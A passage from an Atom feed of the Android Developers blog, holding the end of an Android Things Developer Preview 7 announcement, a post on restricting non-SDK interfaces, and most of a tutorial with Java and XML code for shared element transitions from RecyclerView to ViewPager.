The latest preview is based on Android 8.1 and is updated to support &lt;a href="https://developers.google.com/android/guides/releases#december_18_2017_-_version_1180"&gt;version 11.8.0&lt;/a&gt; of Google Play Services. For all the details of what's included in DP7, see the &lt;a href="https://developer.android.com/things/preview/releases.html"&gt;release notes&lt;/a&gt;. Here are some of the highlights:
&lt;/p&gt;
&lt;h3&gt;Console enhancements and device updates&lt;/h3&gt;


&lt;p&gt;
New features are also available in the &lt;a href="https://partner.android.com/things/console"&gt;Android Things Console&lt;/a&gt; to enhance product management from prototype to production:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Product Models.&lt;/strong&gt; Create multiple software variations of the same hardware product, and manage the builds and updates for each independently.
&lt;li&gt;&lt;strong&gt;Product Sharing.&lt;/strong&gt; Grant additional user accounts access to view and manage the models, builds, and updates for a given product.
&lt;li&gt;&lt;strong&gt;Analytics.&lt;/strong&gt; View metrics on device activations and update statistics for your products.
&lt;li&gt;&lt;strong&gt;Update Channels.&lt;/strong&gt; Deploy software builds to groups of devices for development or beta testing, without disrupting production devices in the field.&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
Devices can subscribe to different update channels using new APIs added to &lt;code&gt;UpdateManager&lt;/code&gt;. See the updated &lt;a href="https://developer.android.com/things/sdk/apis/update.html"&gt;Device Updates API guide&lt;/a&gt; and &lt;a href="https://developer.android.com/things/console/update.html"&gt;console documentation&lt;/a&gt; to learn more about configuring update channel subscriptions.
&lt;/p&gt;
&lt;h3&gt;Addressing developer feedback&lt;/h3&gt;


&lt;p&gt;
We've received tons of amazing feedback from developers so far, and focused heavily on addressing many of the top reported issues in this release:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Improved camera resolution support.&lt;/strong&gt; Apps can now capture image data up to the full native resolution of the camera hardware.
&lt;li&gt;&lt;strong&gt;Support for MIDI.&lt;/strong&gt; Use the &lt;a href="https://developer.android.com/reference/android/media/midi/MidiManager.html"&gt;MidiManager&lt;/a&gt; API to build a virtual MIDI device in your app or interface with external MIDI controllers.
&lt;li&gt;&lt;strong&gt;Better testability of Android Things apps.&lt;/strong&gt; The &lt;a href="https://developer.android.com/things/sdk/pio/index.html"&gt;Peripheral I/O&lt;/a&gt; API now exposes interfaces instead of abstract classes, allowing local unit tests to replace these objects with mocks and stubs more easily.
&lt;li&gt;&lt;strong&gt;Consistent API naming.&lt;/strong&gt; This release renames many of the existing Android Things API classes to provide a more consistent developer experience across the entire surface. See the updated &lt;a href="https://developer.android.com/things/reference/index.html"&gt;API reference&lt;/a&gt; to review how package and class names have changed.&lt;/li&gt;&lt;/ul&gt;

&lt;h3&gt;New Bluetooth APIs&lt;/h3&gt;


&lt;p&gt;
Android mobile devices expose controls to users for pairing with and connecting to Bluetooth devices through the Settings app. IoT devices running Android Things need to programmatically perform these same operations. The new &lt;code&gt;BluetoothConnectionManager&lt;/code&gt; API enables apps to take control of the pairing and connection process. See the new &lt;a href="https://developer.android.com/things/sdk/apis/bluetooth.html"&gt;Bluetooth API guide&lt;/a&gt; for more details.
&lt;/p&gt;
&lt;h3&gt;Sample updates&lt;/h3&gt;


&lt;p&gt;
Last year at Google I/O, we demonstrated &lt;a href="https://www.youtube.com/watch?v=v3Dm5aeuQKE"&gt;building an app using Kotlin&lt;/a&gt; on Android Things. For developers using Kotlin, we have started publishing Kotlin versions of the Android Things samples. Today you can download the &lt;a href="https://github.com/androidthings/sample-button"&gt;Button and LED sample&lt;/a&gt; in both Kotlin and Java, with more samples to follow very soon.
&lt;/p&gt;
&lt;p&gt;
We have also migrated the &lt;a href="https://github.com/androidthings/sample-tensorflow-imageclassifier"&gt;TensorFlow Image Classifier&lt;/a&gt; sample app to use the &lt;a href="https://www.tensorflow.org/mobile/tflite/"&gt;TensorFlow Lite&lt;/a&gt; library, reducing the size of the pre-trained TensorFlow model by over 90% and the time required to classify the images by approximately 50%.
&lt;/p&gt;
&lt;h3&gt;Feedback&lt;/h3&gt;


&lt;p&gt;
Please send us your feedback by filing &lt;a href="https://issuetracker.google.com/issues/new?component=192720&amp;template=847005"&gt;bug reports&lt;/a&gt; and &lt;a href="https://issuetracker.google.com/issues/new?component=192720&amp;template=848805"&gt;feature requests&lt;/a&gt;, as well as asking any questions on &lt;a href="https://stackoverflow.com/questions/tagged/android-things"&gt;Stack Overflow&lt;/a&gt;. You can also join &lt;a href="https://g.co/iotdev"&gt;Google's IoT Developers Community&lt;/a&gt; on Google+, a great resource to get updates and discuss ideas. We look forward to seeing what you build with Android Things!
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=5bcQhp9URQc:3tVqyNjCRqE:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=5bcQhp9URQc:3tVqyNjCRqE:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=5bcQhp9URQc:3tVqyNjCRqE:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/5bcQhp9URQc" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/33458597185895777"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/33458597185895777"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/5bcQhp9URQc/android-things-developer-preview-7.html" title="Android Things Developer Preview 7"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/android-things-developer-preview-7.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-8414250375099589046</id>
    <published>2018-02-28T08:44:00.004-08:00</published>
    <updated>2018-02-28T09:23:21.326-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="stability"/>
    <title type="text">Improving Stability by Reducing Usage of non-SDK Interfaces</title>
    <content type="html">&lt;em&gt;Posted by David Brazdil, Software Engineer&lt;/em&gt;

&lt;p&gt;
In Android, we're always looking for ways to improve the user and developer experience by making those experiences as stable as possible.   In this spirit, we've been working to ensure that apps don't use non-SDK interfaces, since doing so risks crashes for users and emergency rollouts for developers.  In Android N, &lt;a href="https://android-developers.googleblog.com/2016/06/improving-stability-with-private-cc.html"&gt;we restricted the set of symbols that C/C++ code could use&lt;/a&gt;.  This change ensured that apps using C++ rely on stable NDK interfaces rather than incur the incremental crashes caused by reliance on unstable, non-NDK interfaces.   Starting in the next release of Android, we will further increase stability by expanding these restrictions to cover the Java language interfaces of the SDK.  
&lt;/p&gt;
&lt;h3&gt;What behavior will I see?&lt;/h3&gt;


&lt;p&gt;
Starting in the next release of Android, some non-SDK methods and fields will be restricted so that you cannot access them -- either directly, via reflection, or JNI.  If you try, you can see errors such as NoSuchFieldException or NoSuchMethodException.  
&lt;/p&gt;
&lt;p&gt;
Initially, this restriction will impact interfaces with low or no usage.  It is an explicit goal of our planning and design to respect our developer community and create the absolute minimum of change while addressing app stability issues flagged by our users and device manufacturers. In cases where a migration to SDK methods will be possible but is likely to be technically challenging, we'll allow continued usage until your app is updated to target the latest API level.  We plan to broaden these restrictions in future platform versions, giving developers time to migrate with long advance warning, and also giving us time to gather feedback about any needed SDK interfaces.  We have always said that using non-SDK interfaces is always risky -- they might change in any release as we refactor code to add features or fix bugs.  So if your app currently relies on non-SDK interfaces, you should begin planning a migration to SDK alternatives.
&lt;/p&gt;
&lt;p&gt;
Because the Java language has different features from C++, this restriction will take a slightly different form than the previous symbol restriction.  You should not access classes that are not part of &lt;a href="https://developer.android.com/reference/packages.html"&gt;our SDK&lt;/a&gt;, but you also need to be sure that you are only using the officially documented parts of each class.  In particular, this means that you should not plan to access methods or fields that are not listed in the SDK when you interact with a class via semantics such as reflection.
&lt;/p&gt;
&lt;h3&gt;What if there isn't a SDK alternative?&lt;/h3&gt;


&lt;p&gt;
We know that some apps may be using non-SDK interfaces in ways that do not have an SDK alternative.  We value your feedback about where and how we need to expand and improve the public APIs for you. If you feel that you'll need the SDK API expanded before you can stop using non-SDK ones, please &lt;a href="https://issuetracker.google.com/issues/new?component=328403&amp;template=1027267"&gt;tell us via our bug tracker&lt;/a&gt;.  We will be monitoring this list closely and using this valuable feedback to prioritize. It is critical for us to get this feedback in a timely manner so that we can continue to both tune the blacklist to minimize developer impact and also begin developing any needed alternatives for future platforms.
&lt;/p&gt;
&lt;h3&gt;What's coming next?&lt;/h3&gt;


&lt;p&gt;
In the next Android developer preview, you'll be able to run your existing apps and see warnings when you use a non-SDK interface that will be subject to blacklist or greylist in the final release.   It's always a best practice to make sure your app runs on the developer preview, but you should pay specific attention to the interface compatibility warnings if you are concerned that you may be impacted.
&lt;/p&gt;
&lt;p&gt;
In conjunction with the next developer preview and the new bug tracker category, we'll be monitoring usage of non-SDK interfaces.  In cases where official SDK alternatives already exist, we'll publish official guidance on how to migrate away from commonly used non-SDK interfaces. 
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=lVHkyhIkIeQ:i4MToJQPq8c:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=lVHkyhIkIeQ:i4MToJQPq8c:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=lVHkyhIkIeQ:i4MToJQPq8c:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/lVHkyhIkIeQ" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/8414250375099589046"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/8414250375099589046"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/lVHkyhIkIeQ/improving-stability-by-reducing-usage.html" title="Improving Stability by Reducing Usage of non-SDK Interfaces"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/improving-stability-by-reducing-usage.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-3903393641843860369</id>
    <published>2018-02-20T09:00:00.000-08:00</published>
    <updated>2018-02-20T09:00:33.025-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="DAC/Design"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="DAC/Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Fragments"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="motion."/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Shared Elements"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="transitions"/>
    <title type="text">Continuous Shared Element Transitions: RecyclerView to ViewPager</title>
    <content type="html">&lt;em&gt;By Shalom Gibly, Software Engineer, Google's Material Gallery Team&lt;/em&gt;

&lt;p&gt;
Transitions in Material Design apps provide visual continuity. As the user navigates the app, views in the app change state. Motion and transformation reinforce the idea that interfaces are tangible, connecting common elements from one view to the next.
&lt;/p&gt;
&lt;p&gt;
This post aims to provide guidelines and implementation for a specific continuous transition between Android Fragments. We will demonstrate how to implement a transition from an image in a RecyclerView into an image in a ViewPager and back, using 'Shared Elements' to determine which views participate in the transition and how. We will also handle the tricky case of transitioning back to the grid after paging to an item that was previously offscreen.
&lt;/p&gt;
&lt;p&gt;
This is the result we are aiming for:
&lt;/p&gt;

&lt;center&gt;&lt;div class="cont221"&gt;&lt;a href="https://2.bp.blogspot.com/-SYxpgdCZYdQ/WoYW8x3m0II/AAAAAAAAFEs/m4ZE9gpGwsE1n1SopuBkvbg9_IGzGqgpgCLcBGAs/s1600/intro.gif" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-SYxpgdCZYdQ/WoYW8x3m0II/AAAAAAAAFEs/m4ZE9gpGwsE1n1SopuBkvbg9_IGzGqgpgCLcBGAs/s1600/intro.gif" data-original-width="444" data-original-height="859" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;
If you wish to skip the explanation and go straight to the code, you can find it &lt;a href="https://github.com/google/android-transition-examples/tree/master/GridToPager"target="_blank" attribute"&gt;here&lt;/a&gt;.
&lt;/p&gt;
&lt;h1&gt;What are shared elements?&lt;/h1&gt;


&lt;p&gt;
A &lt;em&gt;shared element transition&lt;/em&gt; determines how views that are present in two fragments transition between them. For example, an image that is displayed on an &lt;code&gt;ImageView&lt;/code&gt; on both Fragment &lt;code&gt;A&lt;/code&gt; and Fragment &lt;code&gt;B&lt;/code&gt; transitions from &lt;code&gt;A&lt;/code&gt; to &lt;code&gt;B&lt;/code&gt; when &lt;code&gt;B&lt;/code&gt; becomes visible.
&lt;/p&gt;
&lt;p&gt;
There are numerous previously published examples which explain how shared elements work and how to implement a basic Fragment transition. This post will skip most of the basics and will walk through the specifics on how to create a working transition into a ViewPager and back. However, if you'd like to learn more about transitions, I recommend starting by reading about transitions at the &lt;a href="https://developer.android.com/training/material/animations.html#Transitions"target="_blank" attribute"&gt;Android's developers website&lt;/a&gt;, and take the time to watch this 2016 Google I/O &lt;a href="https://www.youtube.com/watch?v=4L4fLrWDvAU"target="_blank" attribute"&gt;presentation&lt;/a&gt;.
&lt;/p&gt;
&lt;h1&gt;The challenges&lt;/h1&gt;


&lt;h3&gt;Shared Element mapping&lt;/h3&gt;


&lt;p&gt;
We would like to support a seamless back and forth transition. This includes a transition from the grid to the pager, and then a transition back to the relevant image, even when the user paged to a different image.
&lt;/p&gt;
&lt;p&gt;
To do so, we will need to find a way to &lt;em&gt;dynamically remap&lt;/em&gt; the shared elements in order to provide the Android's transition system what it needs to do its magic!
&lt;/p&gt;
&lt;h3&gt;Delayed loading&lt;/h3&gt;


&lt;p&gt;
Shared element transitions are powerful, but can be tricky when dealing with elements that need to be loaded before we can transition to them. The transition may simply not work as expected when views at the target fragment are not laid out and ready.
&lt;/p&gt;
&lt;p&gt;
In this project, there are two areas where a loading time affects the shared element transition:
&lt;/p&gt;&lt;ol&gt;

&lt;li&gt;It takes a few milliseconds for the &lt;code&gt;ViewPager&lt;/code&gt; to load its internal fragments. Additionally, it takes time to load an image into the displayed pager fragment (may even include a download time for the asset).
&lt;li&gt;The &lt;code&gt;RecyclerView&lt;/code&gt; also faces a similar delay when loading the images into its views.&lt;/li&gt;&lt;/ol&gt;

&lt;h1&gt;Demo app design&lt;/h1&gt;


&lt;h3&gt;Basic structure&lt;/h3&gt;


&lt;p&gt;
Before we dive into the juicy transitions, here is a little bit about how the demo app is structured.
&lt;/p&gt;

&lt;a href="https://2.bp.blogspot.com/-azA4tezPzu4/WodDlyfHi3I/AAAAAAAAFFw/Lw2ujG36iyUDccAE7IKQE0LON2Qxhv3_QCLcBGAs/s1600/app_flow.png" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-azA4tezPzu4/WodDlyfHi3I/AAAAAAAAFFw/Lw2ujG36iyUDccAE7IKQE0LON2Qxhv3_QCLcBGAs/s1600/app_flow.png" data-original-width="960" data-original-height="540" style="max-width:100%"/&gt;&lt;/a&gt;

&lt;p&gt;
The MainActivity loads a &lt;code&gt;GridFragment&lt;/code&gt; to present a &lt;code&gt;RecyclerView&lt;/code&gt; of images. The &lt;code&gt;RecyclerView&lt;/code&gt; adapter loads the image items (a constant array that is defined at the &lt;code&gt;ImageData&lt;/code&gt; class), and manages the &lt;code&gt;onClick&lt;/code&gt; events by replacing the displayed &lt;code&gt;GridFragment&lt;/code&gt; with an &lt;code&gt;ImagePagerFragment&lt;/code&gt;.
&lt;/p&gt;
&lt;p&gt;
The &lt;code&gt;ImagePagerFragment&lt;/code&gt; adapter loads the nested &lt;code&gt;ImageFragments&lt;/code&gt; to display the individual images when paging happens.
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Note:&lt;/strong&gt; The demo app implementation uses &lt;a href="https://github.com/bumptech/glide"target="_blank" attribute"&gt;Glide&lt;/a&gt;, which loads images into views asynchronously. The images in the demo app are bundled with it. However, you may easily convert the &lt;code&gt;ImageData&lt;/code&gt; class to hold URL strings that point to online images.
&lt;/p&gt;
&lt;h3&gt;Coordinating a selected/displayed position&lt;/h3&gt;


&lt;p&gt;
To communicate the selected image position between the fragments, we will use the &lt;code&gt;MainActivity&lt;/code&gt; as a place to store the position.
&lt;/p&gt;
&lt;p&gt;
When an item is clicked, or when a page is changed, the MainActivity is updated with the relevant item's position. 
&lt;/p&gt;
&lt;p&gt;
The stored position is later used in several places:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;When determining which page to show in the &lt;code&gt;ViewPager&lt;/code&gt;.
&lt;li&gt;When navigating back to the grid and auto-scrolling to the position to make sure it's visible.
&lt;li&gt;And of course, when hooking up the transitions callbacks, as we'll see in the next section.&lt;/li&gt;&lt;/ul&gt;

&lt;h1&gt;Setting up the transitions&lt;/h1&gt;


&lt;p&gt;
As mentioned above, we will need to find a way to &lt;em&gt;dynamically remap&lt;/em&gt; the shared elements in order to give the transition system what it needs to do its magic.
&lt;/p&gt;
&lt;p&gt;
Using a static mapping by setting up &lt;code&gt;transitionName&lt;/code&gt; attributes for the image views at the XML will not work, as we are dealing with an arbitrary amount of views that share the same layout (e.g. views inflated by the &lt;code&gt;RecyclerView&lt;/code&gt; adapter, or views inflated by the &lt;code&gt;ImageFragment&lt;/code&gt;). 
&lt;/p&gt;
&lt;p&gt;
To accomplish this, we'll use some of what the transition system provides us:
&lt;/p&gt;&lt;ol&gt;

&lt;li&gt;We set a transition name on the image views by calling &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/view/View.html#setTransitionName(java.lang.String)"target="_blank" attribute"&gt;setTransitionName&lt;/a&gt;&lt;/code&gt;. This will identify the view with a unique name for the transition.
&lt;code&gt;setTransitionName&lt;/code&gt; is called when binding a view at the grid's &lt;code&gt;RecyclerView&lt;/code&gt; adapter, and &lt;code&gt;onCreateView&lt;/code&gt; at the &lt;code&gt;ImageFragment&lt;/code&gt;. In both locations, we use the unique image resource as a name to identify the view.
&lt;li&gt;We set up &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/app/SharedElementCallback.html"target="_blank" attribute"&gt;SharedElementCallbacks&lt;/a&gt;&lt;/code&gt; to intercept &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/app/SharedElementCallback.html#onMapSharedElements(java.util.List&lt;java.lang.String&gt;, java.util.Map&lt;java.lang.String, android.view.View&gt;)"target="_blank" attribute"&gt;onMapSharedElements&lt;/a&gt;&lt;/code&gt; and adjust the mapping of the shared element names to views. This will be done when exiting the &lt;code&gt;GridFragment&lt;/code&gt; and when entering the &lt;code&gt;ImagePagerFragment&lt;/code&gt;.&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;Setting the FragmentManager transaction&lt;/h3&gt;


&lt;p&gt;
The first thing we set up to initiate a transition for a fragment replacement is at the &lt;code&gt;FragmentManager&lt;/code&gt; transaction preparation. We need to inform the system that we have a shared element transition.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;fragment.getFragmentManager()
   .beginTransaction()
   .setReorderingAllowed(true) // setAllowOptimization before 26.1.0
   .addSharedElement(imageView, imageView.getTransitionName())
   .replace(R.id.fragment_container, 
        new ImagePagerFragment(),
        ImagePagerFragment.class.getSimpleName())
   .addToBackStack(null)
   .commit();&lt;/pre&gt;


&lt;p&gt;
The &lt;code&gt;setReorderingAllowed&lt;/code&gt; is set to &lt;code&gt;true&lt;/code&gt;. It will reorder the state changes of fragments to allow for better shared element transitions. Added fragments will have &lt;code&gt;onCreate(Bundle)&lt;/code&gt; called before replaced fragments have &lt;code&gt;onDestroy()&lt;/code&gt; called, allowing the shared view to get created and laid out before the transition starts.
&lt;/p&gt;
&lt;h3&gt;Image transition&lt;/h3&gt;


&lt;p&gt;
To define how the image transitions when it animates to its new location, we set up a &lt;code&gt;TransitionSet&lt;/code&gt; in an XML file and load it at the &lt;code&gt;ImagePagerFragment&lt;/code&gt;.
&lt;/p&gt;



&lt;code&gt;&amp;lt;ImagePagerFragment.java&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;Transition transition =
   TransitionInflater.from(getContext())
       .inflateTransition(R.transition.image_shared_element_transition);
setSharedElementEnterTransition(transition);&lt;/pre&gt;





&lt;code&gt;&amp;lt;image_shared_element_transition.xml&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&gt;
&amp;lt;transitionSet
   xmlns:android="http://schemas.android.com/apk/res/android"
   android:duration="375"
   android:interpolator="@android:interpolator/fast_out_slow_in"
   android:transitionOrdering="together"&gt;
 &amp;lt;changeClipBounds/&gt;
 &amp;lt;changeTransform/&gt;
 &amp;lt;changeBounds/&gt;
&amp;lt;/transitionSet&gt;&lt;/pre&gt;


&lt;h3&gt;Adjusting the shared element mapping&lt;/h3&gt;


&lt;p&gt;
We'll start by adjusting the shared element mapping when leaving the &lt;code&gt;GridFragment&lt;/code&gt;. For that, we will call the &lt;code&gt;set&lt;strong&gt;Exit&lt;/strong&gt;SharedElementCallback()&lt;/code&gt; and provide it with a &lt;code&gt;SharedElementCallback&lt;/code&gt; which will map the element names to the views we'd like to include in the transition.

&lt;p&gt;
It's important to note that this callback will be called while &lt;strong&gt;exiting&lt;/strong&gt; the &lt;code&gt;Fragment&lt;/code&gt; when the fragment-transaction occurs, and while &lt;strong&gt;re-entering&lt;/strong&gt; the &lt;code&gt;Fragment&lt;/code&gt; when it's popped out of the backstack (on back navigation). We will use this behavior to remap the shared view and adjust the transition to handle cases where the view is changed after paging the images.
&lt;/p&gt;
&lt;p&gt;
In this specific case, we are only interested in a single &lt;code&gt;ImageView&lt;/code&gt; transition from the grid to the fragment the view-pager holds, so the mapping only needs to be adjusted for the &lt;span style="text-decoration:underline;"&gt;first&lt;/span&gt; named element received at the &lt;code&gt;onMapSharedElements&lt;/code&gt; callback.
&lt;/p&gt;



&lt;code&gt;&amp;lt;GridFragment.java&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;setExitSharedElementCallback(
   new SharedElementCallback() {
     @Override
     public void onMapSharedElements(
         List&amp;lt;String&gt; names, Map&amp;lt;String, View&gt; sharedElements) {
       // Locate the ViewHolder for the clicked position.
       RecyclerView.ViewHolder selectedViewHolder = recyclerView
           .findViewHolderForAdapterPosition(MainActivity.currentPosition);
       if (selectedViewHolder == null || selectedViewHolder.itemView == null) {
         return;
       }

       // Map the first shared element name to the child ImageView.
       sharedElements
           .put(names.get(0),
                selectedViewHolder.itemView.findViewById(R.id.card_image));
     }
   });&lt;/pre&gt;


&lt;p&gt;
We also need to adjust the shared element mapping when entering the &lt;code&gt;ImagePagerFragment&lt;/code&gt;. For that, we will call the &lt;code&gt;set&lt;strong&gt;Enter&lt;/strong&gt;SharedElementCallback()&lt;/code&gt;.&lt;/p&gt;




&lt;code&gt;&amp;lt;ImagePagerFragment.java&gt;&lt;/code&gt;
&lt;pre class="prettyprint"&gt;setEnterSharedElementCallback(
   new SharedElementCallback() {
     @Override
     public void onMapSharedElements(
         List&amp;lt;String&gt; names, Map&amp;lt;String, View&gt; sharedElements) {
          // Locate the image view at the primary fragment (the ImageFragment
          // that is currently visible). To locate the fragment, call
          // instantiateItem with the selection position.
          // At this stage, the method will simply return the fragment at the
          // position and will not create a new one.
       Fragment currentFragment = (Fragment) viewPager.getAdapter()
           .instantiateItem(viewPager, MainActivity.currentPosition);
       View view = currentFragment.getView();
       if (view == null) {
         return;
       }

       // Map the first shared element name to the child ImageView.
       sharedElements.put(names.get(0), view.findViewById(R.id.image));
     }
   });&lt;/pre&gt;


&lt;h3&gt;Postponing the transition&lt;/h3&gt;


&lt;p&gt;
The images we would like to transition are loaded into the grid and the pager and take time to load. To make it work properly, we will need to &lt;strong&gt;postpone&lt;/strong&gt; the transition until the participating views are ready (e.g. laid out and loaded with the image data).
&lt;/p&gt;
&lt;p&gt;
To do so, we call a &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/v4/app/Fragment.html#postponeEnterTransition()"target="_blank" attribute"&gt;postponeEnterTransition()&lt;/a&gt;&lt;/code&gt; in our fragments' &lt;code&gt;onCreateView()&lt;/code&gt;, and once the image is loaded, we start the transition by calling  &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/v4/app/Fragment.html#startPostponedEnterTransition()"&gt;startPostponedEnterTransition()&lt;/a&gt;&lt;/code&gt;.




&lt;p&gt;&lt;em&gt;Note: postpone is called for both the grid and the pager fragments to support both forward and backward transitions when navigating the app.&lt;/em&gt;&lt;p&gt;


&lt;p&gt;
Since we are using &lt;em&gt;Glide&lt;/em&gt; to load the images, we set up listeners that trigger the enter transition when images are loaded.
&lt;/p&gt;
&lt;p&gt;

This is done in two places:
&lt;/p&gt;&lt;ol&gt;

&lt;li&gt;When an &lt;code&gt;ImageFragment&lt;/code&gt; image is loaded, a call is made to its parent &lt;code&gt;ImagePagerFragment&lt;/code&gt; to start the transition.
&lt;li&gt;When transitioning back to the grid, a start transition is called after the "&lt;em&gt;selected&lt;/em&gt;" image is loaded.&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;
Here is how the &lt;code&gt;ImageFragment&lt;/code&gt; loads an image and notifies its parent when it's ready.
&lt;/p&gt;
&lt;p&gt;
Note that the &lt;code&gt;postponeEnterTransition&lt;/code&gt; is made at the the &lt;code&gt;ImagePagerFragment&lt;/code&gt;, while the &lt;code&gt;startPostponeEnterTransition&lt;/code&gt; is called from the child &lt;code&gt;ImageFragment&lt;/code&gt; that is created by the pager.
&lt;/p&gt;



&lt;code&gt;&amp;lt;ImageFragment.java&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;Glide.with(this)
   .load(arguments.getInt(KEY_IMAGE_RES)) // Load the image resource
   .listener(new RequestListener&amp;lt;Drawable&gt;() {
     @Override
     public boolean onLoadFailed(@Nullable GlideException e, Object model,
         Target&amp;lt;Drawable&gt; target, boolean isFirstResource) {
       getParentFragment().startPostponedEnterTransition();
       return false;
     }

     @Override
     public boolean onResourceReady(Drawable resource, Object model,
         Target&amp;lt;Drawable&gt; target, DataSource dataSource, boolean isFirstResource) {
       getParentFragment().startPostponedEnterTransition();
       return false;
     }
   })
   .into((ImageView) view.findViewById(R.id.image));&lt;/pre&gt;


&lt;p&gt;
As you may have noticed, we also call to start the postponed transition when the loading fails. This is important to prevent the UI from hanging during failure.
&lt;/p&gt;
&lt;h1&gt;Final touches&lt;/h1&gt;


&lt;p&gt;
To make our transitions even smoother, we would like to fade out the grid items when the image transitions to the pager view.
&lt;/p&gt;
&lt;p&gt;
To do that, we create a &lt;code&gt;TransitionSet&lt;/code&gt; that is applied as an exit transition for the &lt;code&gt;GridFragment&lt;/code&gt;.
&lt;/p&gt;



&lt;code&gt;&amp;lt;GridFragment.java&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;setExitTransition(TransitionInflater.from(getContext())
   .inflateTransition(R.transition.grid_exit_transition));&lt;/pre&gt;





&lt;code&gt;&amp;lt;grid_exit_transition.xml&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&gt;
&amp;lt;transitionSet xmlns:android="http://schemas.android.com/apk/res/android"
   android:duration="375"
   android:interpolator="@android:interpolator/fast_out_slow_in"
   android:startDelay="25"&gt;
 &amp;lt;fade&gt;
   &amp;lt;targets android:targetId="@id/card_view"/&gt;
 &amp;lt;/fade&gt;
&amp;lt;/transitionSet&gt;&lt;/pre&gt;


&lt;p&gt;
This is what the transition looks like after this exit transition is set up:
&lt;/p&gt;

&lt;center&gt;&lt;div class="cont221"&gt;&lt;a href="https://3.bp.blogspot.com/-Tt8JRTzu2GQ/WoYXhH-sP-I/AAAAAAAAFE4/Z2PXCW0hAIY1YVFBzUAlk2VKGIDezagTgCLcBGAs/s1600/without-excluding-item.gif" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-Tt8JRTzu2GQ/WoYXhH-sP-I/AAAAAAAAFE4/Z2PXCW0hAIY1YVFBzUAlk2VKGIDezagTgCLcBGAs/s1600/without-excluding-item.gif" data-original-width="444" data-original-height="859" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;
As you may have noticed, the transition is still not completely polished with this setup. The fade animation is running for all the grid's card views, including the card that holds the image that transitions to the pager.
&lt;/p&gt;
&lt;p&gt;
